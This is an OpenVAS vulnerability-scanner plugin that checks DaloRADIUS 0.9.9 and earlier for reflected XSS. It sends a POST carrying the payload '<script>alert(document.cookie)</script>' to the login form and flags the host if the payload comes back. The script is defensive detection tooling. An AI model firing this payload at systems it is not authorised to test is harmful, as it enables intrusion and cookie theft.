###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_daloradius_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# DaloRADIUS Web Management Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML or
  web script in a user's browser session in context of an affected site,
  compromise the application and access or modify data in the database.
  Impact Level: Application";

tag_affected = "DaloRADIUS version 0.9.9 and prior";
tag_insight = "- The acct-ipaddress.php script not properly sanitizing user-supplied input
    to the 'orderBy' and 'ipaddress' parameters.
  - The application does not require multiple steps or explicit confirmation
    for sensitive transactions.
  - The application does not validate the 'username' parameter upon submission
    to the mng-search.php script and does 'daloradiusFilter' parameter upon
    submission to the rep-logs-daloradius.php script.";
tag_solution = "No solution or patch is available as of 18th March, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.daloradius.com/";
tag_summary = "This host is installed with DaloRADIUS Web Management and is prone
  to multiple vulnerabilities.";

if(description)
{
  script_id(803183);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-18 12:29:46 +0530 (Mon, 18 Mar 2013)");
  script_name("DaloRADIUS Web Management Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/91436");
  script_xref(name : "URL" , value : "http://osvdb.org/91432");
  script_xref(name : "URL" , value : "http://osvdb.org/91433");
  script_xref(name : "URL" , value : "http://osvdb.org/91434");
  script_xref(name : "URL" , value : "http://osvdb.org/91435");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120828/");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/daloradius-csrf-xss-sql-injection");

  script_description(desc);
  script_summary("Check if DaloRADIUS is vulnerable to XSS vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
port = "";
req = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get the host
host = get_host_name();
if(!host){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/radius", "/daloradius", cgi_dirs()))
{
  ## Request for the index.php
  sndReq = http_get(item:string(dir, "/login.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);


  ## confirm the Application
  if(">daloRADIUS<" >< rcvRes && "> daloRADIUS Copyright" >< rcvRes)
  {

    postdata = "operator_user=%3Cscript%3Ealert%28document.cookie%29%3C%2" +
               "Fscript%3E&operator_pass=&location=default";

    url = dir  + "/dologin.php";

    ## Construct the POST data
    req = string("POST ", url , " HTTP/1.1\r\n",
                 "Host: ", host,"\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    rcvRes = http_keepalive_send_recv(port:port, data:req);

    ## Construct Attack Request
    if("<script>alert(document.cookie)</script>" ><  rcvRes &&
       "radius.operators" >< rcvRes)
    {
      security_hole(port);
      exit(0);
    }
  }
}
